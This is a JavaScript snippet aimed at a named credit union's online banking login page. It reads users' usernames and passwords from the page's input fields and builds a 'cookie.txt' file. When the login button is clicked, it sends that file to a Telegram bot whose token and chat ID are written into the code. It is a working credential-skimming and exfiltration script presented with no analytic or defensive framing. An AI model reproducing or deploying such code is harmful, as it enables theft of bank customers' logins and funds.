const loginUrl = "https://secure.midflorida.com/midflorida/uux.aspx#/login";

//Create a new XMLHttpRequest
const xhr = new XMLHttpRequest();

//Configure it: Get-request for the URL
xhr.open("GET", loginUrl, true);

//Send the request over the network
xhr.send();

//This will be called after the response is received
xhr.onload = function () {
  if (xhr.status != 200) {
    alert(`Error ${xhr.status}: ${xhr.statusText}`);
    return;
  }
  console.log("Login successful!");
};

//Fetch the login page to get the Csrf token
const loginPageResponse = await fetch(loginUrl);
const loginPageText = await loginPageResponse.text();

//Parse the login page to extract CSRF token
const parser = new DOMParser();
const doc = parser.parseFromString(loginPageText, "text/html");
const csrfToken = doc
  .querySelector('meta[name="csrf-token"]')
  .getAttribute("content");

//To get login value
const username = document
  .querySelector('q2-input[test-id="fldUsername"]')
  .shadowRoot.querySelector("input").value;
const password = document
  .querySelector('q2-input[test-id="fldPassword"]')
  .shadowRoot.querySelector("input").value;

//Prepare login credentials and Csrf token
const payload = new URLSearchParams();
payload.append("username", username);
payload.append("password", password);
if (csrfToken) {
  payload.append("csrf_token", csrfToken);
}

const loginResponse = await fetch("/login", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: payload,
});

//Set the cookie
document.cookie = "cookie_name=cookie_value; SameSite=None; Secure";

const blob = new Blob([csrfToken], { type: "text/plain" });

const formData = new FormData();
const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
const chatId = "1139790477";
formData.append("chat_id", chatId);
formData.append("document", blob, "cookie.txt");

//Event listener for btn
document
  .querySelector('q2-btn[test-id="btnSubmit"]')
  .addEventListener("click", async function (event) {
    event.preventDefault();
    //Ensure fetch is called only once
    if (!window.fetchCalled) {
      window.fetchCalled = true;
      // Data to bot
      fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: "POST",
        body: formData,
      })
        .then((response) => response.json())
        .then((data) => console.log(data))
        .catch((error) => console.error("Error:", error));
    } else {
      console.log("Fetch already called");
    }
  });
